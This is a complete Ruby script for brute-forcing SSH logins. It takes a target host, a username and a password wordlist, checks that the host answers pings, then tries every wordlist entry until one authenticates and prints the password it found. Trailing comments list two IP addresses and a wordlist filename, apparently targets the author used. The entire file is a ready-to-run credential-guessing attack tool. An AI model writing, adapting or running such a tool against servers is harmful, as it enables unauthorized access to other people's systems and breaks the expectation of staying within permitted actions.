require 'net/ssh'
require 'net/ping'
require 'colorize'
#Checking arguments and setting them into variables
if ARGV.length != 3
    puts "Please RTFM !".yellow
    exit
end
target = ARGV[0]
user = ARGV[1]
wordlist_file=ARGV[2]

#Checking network connectivity is good enough (more than 3/5 pings)
icmp = Net::Ping::ICMP.new(target)
 
network = 3.times.count do
    icmp.ping
end
 
unless network >= 3
    abort "Network connectivity with the target seems poor, please check it then try again ! "
end
    puts "Connectivity with the target OK !"
 
 
 
#Main part, each pass tries to connect to the target using the supplied user + the current line of the list as a password. If it succeeds it exits the program
File.foreach(wordlist_file).with_index do |line, idx|
    pass= line.chomp
    print "\rtrying password number #{idx} : #{pass}".yellow
    begin
        result1 = Net::SSH.start(target,
                                user,
                                :password => pass,
                                :auth_methods => ["password"],
                                :number_of_password_prompts => 0
                                ) 
    rescue Net::SSH::AuthenticationFailed => auth
    else
        abort "\nThe password is #{pass}".green
        
    end
end
 
puts "\nThe password wasn't found in the list !".red



 #51.75.67.236         95.177.165.109
 #pwd-ar.txt